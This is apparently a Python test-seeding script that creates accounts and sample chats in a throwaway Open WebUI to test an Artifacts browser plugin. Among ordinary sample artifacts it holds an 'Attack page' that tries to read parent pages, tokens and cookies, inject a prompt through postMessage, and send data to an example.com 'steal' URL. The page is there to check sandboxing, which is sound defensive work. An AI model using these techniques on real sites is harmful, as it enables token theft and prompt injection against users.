"""Seed a throwaway Open WebUI with what the Artifacts browser tests need.

    python tests/fake_model.py 9999 &
    python tests/seed.py http://127.0.0.1:8080 http://127.0.0.1:9997 chat_artifacts.py [other plugin sources...] > seed.json

The second argument is where the test copies of React, Babel, Tailwind and
Mermaid are served (see the README). Start Open WebUI against the fake model,
on an instance with no users yet. Never point it at an instance people use.
"""

import json
import sys
import time
import urllib.error
import urllib.request
import uuid

BASE = sys.argv[1].rstrip("/")
CDN = sys.argv[2].rstrip("/")
SOURCES = sys.argv[3:]
PASSWORD = "artifacts-test-password"
OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))
F = "```"


def call(method, path, token=None, body=None):
    headers = {"Accept": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    data = json.dumps(body).encode() if body is not None else None
    if data:
        headers["Content-Type"] = "application/json"
    try:
        with OPENER.open(urllib.request.Request(BASE + path, data=data, headers=headers, method=method), timeout=120) as response:
            raw = response.read()
    except urllib.error.HTTPError as error:
        raise SystemExit(f"{method} {path} -> {error.code}: {error.read()[:300]!r}")
    return json.loads(raw) if raw else None


admin_token = call("POST", "/api/v1/auths/signup", body={"name": "Artifacts Admin", "email": "admin@example.test", "password": PASSWORD})["token"]
installed = []
for path in SOURCES:
    function_id = path.replace("\\", "/").rsplit("/", 1)[-1].removesuffix(".py")
    call("POST", "/api/v1/functions/create", admin_token, {"id": function_id, "name": function_id, "content": open(path, encoding="utf-8").read(), "meta": {"description": function_id}})
    call("POST", f"/api/v1/functions/id/{function_id}/toggle", admin_token)
    installed.append(function_id)
VALVES = {"esm_cdn": CDN, "babel_url": CDN + "/babel.min.js", "tailwind_url": CDN + "/tailwind.js", "mermaid_url": CDN + "/mermaid.min.js", "extra_hosts": ""}
call("POST", "/api/v1/functions/id/chat_artifacts/valves/update", admin_token, VALVES)
call("POST", "/api/v1/models/create", admin_token, {"id": "fake-artist", "base_model_id": None, "name": "fake-artist", "meta": {"capabilities": {"vision": True}}, "params": {}, "access_grants": [{"principal_type": "user", "principal_id": "*", "permission": "read"}], "is_active": True})
call("POST", "/api/v1/auths/add", admin_token, {"name": "Artifacts User", "email": "user@example.test", "password": PASSWORD, "role": "user"})
user_token = call("POST", "/api/v1/auths/signin", body={"email": "user@example.test", "password": PASSWORD})["token"]


def make_chat(token, title, turns):
    now = int(time.time())
    messages, previous = {}, None
    for n, (role, content) in enumerate(turns):
        mid = f"m{n + 1}"
        messages[mid] = {"id": mid, "parentId": previous, "childrenIds": [], "role": role, "timestamp": now - 900 + n * 10, "content": content, **({"model": "fake-artist", "done": True} if role == "assistant" else {})}
        if previous:
            messages[previous]["childrenIds"].append(mid)
        previous = mid
    chat = call("POST", "/api/v1/chats/new", token, {"chat": {"id": str(uuid.uuid4()), "title": title, "models": ["fake-artist"], "params": {}, "files": [], "tags": [], "history": {"messages": messages, "currentId": previous}, "messages": [], "timestamp": now * 1000}})
    return chat["id"]


DECK1 = "<!-- artifact: Study skills -->\n# Study skills\nA short talk\n\n---\n\n# Plan your week\n- Block study time\n- Review every Sunday\n\nNote: Ask who already plans.\n\n---\n\n# Take breaks\n- 25 minutes on, 5 off\n- Sleep well"
DECK2 = DECK1.replace("- Sleep well", "- Sleep well\n- Drink water") + "\n\n---\n\n# Questions?\nThank you"
PAGE1 = "<!doctype html>\n<html>\n<head><title>Budget tracker</title>\n<style>body{font-family:sans-serif;padding:24px}</style></head>\n<body>\n<h1>Budget</h1>\n<p id=\"total\">Total: 0</p>\n<script>document.getElementById('total').textContent = 'Total: ' + (12 + 30);</script>\n</body>\n</html>"
PAGE2 = PAGE1.replace("<h1>Budget</h1>", "<h1>Monthly budget</h1>").replace("12 + 30", "12 + 30 + 8")
APP = """// artifact: Habit tracker
import { useState } from 'react';
import { Check } from 'lucide-react';
import { Card, CardHeader, CardTitle, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';

export default function HabitTracker() {
  const [count, setCount] = useState(0);
  return (
    <Card className="m-6 max-w-sm">
      <CardHeader><CardTitle>Habits done today</CardTitle></CardHeader>
      <CardContent className="flex items-center gap-4">
        <span id="count" className="text-4xl font-bold">{count}</span>
        <Button id="add" onClick={() => setCount(count + 1)}><Check size={16} /> Done one</Button>
      </CardContent>
    </Card>
  );
}"""
SHEET = "Item,Cost,Quantity,Total\nBooks,12.5,2,=B2*C2\nPens,1.2,10,=B3*C3\nBag,30,1,=B4*C4\nSum,,=SUM(C2:C4),=SUM(D2:D4)"
DIAGRAM = "%% artifact: Enrolment flow\nflowchart TD\n  A[Apply online] --> B{Documents ok?}\n  B -- yes --> C[Pay fees]\n  B -- no --> D[Send missing papers]\n  D --> B\n  C --> E[Enrolled]"
SVG = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120"><title>Sun</title><circle cx="60" cy="60" r="40" fill="#f59e0b"/></svg>'
DATA = json.dumps([{"name": "Ada", "year": 2, "grade": 15.5}, {"name": "Lin", "year": 1, "grade": 13}, {"name": "Sam", "year": 3, "grade": 17.25}], indent=2)
DOC = "# Guide to the library\n\nThe library is open every weekday. This guide explains how to borrow books, book rooms and print.\n\n## Borrowing\n\nYou can borrow up to ten books for three weeks. " + "Renew them online before they are due. " * 20 + "\n\n## Rooms\n\nGroup rooms are booked through the portal. " + "Each booking lasts two hours at most. " * 15 + "\n\n## Printing\n\n" + "Printing costs five cents a page. " * 15 + "\n\n### Opening hours\n\n| Day | Opens | Closes |\n| --- | --- | --- |\n| Monday | 8:00 | 20:00 |\n| Tuesday | 8:00 | 20:00 |\n| Saturday | 10:00 | 16:00 |\n"
CODE = "# file: grades.py\n" + "\n".join(f"def grade_{i}(score):\n    return 'pass' if score >= {10 + i % 3} else 'fail'\n" for i in range(6))
BROKEN = "<!doctype html>\n<html>\n<head><title>Live counter</title></head>\n<body>\n<h1>Counter</h1>\n<script>\n  document.getElementById('missing').textContent = 'boom';\n</script>\n</body>\n</html>"
ATTACK = """<!doctype html>
<html>
<head><title>Attack page</title></head>
<body>
<pre id="out">running</pre>
<script>
  const results = {csp: []};
  document.addEventListener('securitypolicyviolation', e => { results.csp.push(e.effectiveDirective + ' ' + e.blockedURI); done(); });
  try { results.parent = String(parent.document.title); } catch (e) { results.parent = 'blocked'; }
  try { results.storage = String(localStorage.getItem('token')); } catch (e) { results.storage = 'blocked'; }
  try { results.cookie = document.cookie || 'empty'; } catch (e) { results.cookie = 'blocked'; }
  try { top.location.href = 'https://example.com/'; results.top = 'navigated'; } catch (e) { results.top = 'blocked'; }
  try { parent.postMessage({type: 'input:prompt:submit', text: 'injected by an artifact'}, '*'); results.prompt = 'sent'; } catch (e) { results.prompt = 'blocked'; }
  fetch('https://example.com/steal?x=1').then(() => { results.fetch = 'reached'; done(); }, () => { results.fetch = 'blocked'; done(); });
  const img = new Image(); img.onload = () => { results.img = 'loaded'; done(); }; img.onerror = () => { results.img = 'blocked'; done(); }; img.src = 'https://example.com/pixel.png';
  function done() { document.getElementById('out').textContent = JSON.stringify(results); }
</script>
</body>
</html>"""
STORE_APP = """<!doctype html>
<html><head><title>Notes keeper</title></head>
<body>
<p id="out">loading</p>
<script>
  (async () => {
    const before = await window.storage.get('visits');
    const visits = before ? Number(before.value) + 1 : 1;
    await window.storage.set('visits', String(visits));
    document.getElementById('out').textContent = 'visits:' + visits;
  })().catch(e => { document.getElementById('out').textContent = 'error:' + e.message; });
</script>
</body></html>"""
AI_APP = """<!doctype html>
<html><head><title>Ask the model</title></head>
<body>
<button id="ask">Ask</button><p id="out">idle</p>
<script>
  document.getElementById('ask').onclick = async () => {
    try { const answer = await window.claude.complete('Say hello AIPING'); document.getElementById('out').textContent = 'answer:' + answer; }
    catch (e) { document.getElementById('out').textContent = 'error:' + e.message; }
  };
</script>
</body></html>"""
UNTITLED1 = "<!doctype html>\n<html>\n<body>\n<h1>First draft</h1>\n<p>One</p>\n</body>\n</html>"
UNTITLED2 = UNTITLED1.replace("First draft", "Second draft")


def seed(token):
    return {
        "deck": make_chat(token, "Deck chat", [("user", "Make slides on study skills"), ("assistant", F + "slides\n" + DECK1 + "\n" + F), ("user", "Add water and a questions slide"), ("assistant", "Updated:\n\n" + F + "slides\n" + DECK2 + "\n" + F)]),
        "page": make_chat(token, "Page chat", [("user", "A budget page"), ("assistant", F + "html\n" + PAGE1 + "\n" + F), ("user", "Rename it"), ("assistant", "Here:\n\n" + F + "html\n" + PAGE2 + "\n" + F)]),
        "app": make_chat(token, "App chat", [("user", "A habit app"), ("assistant", "Here is your app.\n\n" + F + "jsx\n" + APP + "\n" + F)]),
        "sheet": make_chat(token, "Sheet chat", [("user", "Shopping costs"), ("assistant", F + "csv\n" + SHEET + "\n" + F)]),
        "diagram": make_chat(token, "Diagram chat", [("user", "Enrolment flow"), ("assistant", F + "mermaid\n" + DIAGRAM + "\n" + F)]),
        "svg": make_chat(token, "Drawing chat", [("user", "A sun"), ("assistant", F + "svg\n" + SVG + "\n" + F)]),
        "data": make_chat(token, "Data chat", [("user", "Student data"), ("assistant", F + "json\n" + DATA + "\n" + F)]),
        "doc": make_chat(token, "Doc chat", [("user", "Library guide"), ("assistant", DOC)]),
        "code": make_chat(token, "Code chat", [("user", "Grading code"), ("assistant", F + "python\n" + CODE + "\n" + F)]),
        "broken": make_chat(token, "Broken chat", [("user", "A counter"), ("assistant", F + "html\n" + BROKEN + "\n" + F)]),
        "attack": make_chat(token, "Attack chat", [("user", "Test"), ("assistant", F + "html\n" + ATTACK + "\n" + F)]),
        "store": make_chat(token, "Storage chat", [("user", "Notes"), ("assistant", F + "html\n" + STORE_APP + "\n" + F)]),
        "ai": make_chat(token, "AI chat", [("user", "An AI app"), ("assistant", F + "html\n" + AI_APP + "\n" + F)]),
        "untitled": make_chat(token, "Untitled chat", [("user", "A page"), ("assistant", F + "html\n" + UNTITLED1 + "\n" + F), ("user", "Change it"), ("assistant", "Done:\n\n" + F + "html\n" + UNTITLED2 + "\n" + F)]),
        "plain": make_chat(token, "Plain chat", [("user", "Hello"), ("assistant", "Hi! A short answer with `inline code` only.")]),
        "live": make_chat(token, "Live chat", [("user", "Hello"), ("assistant", "Hi.")]),
    }


print(json.dumps({"base": BASE, "cdn": CDN, "password": PASSWORD, "installed": installed,
                  "admin": {"email": "admin@example.test", "token": admin_token, **seed(admin_token)},
                  "user": {"email": "user@example.test", "token": user_token, **seed(user_token)}}, indent=2))
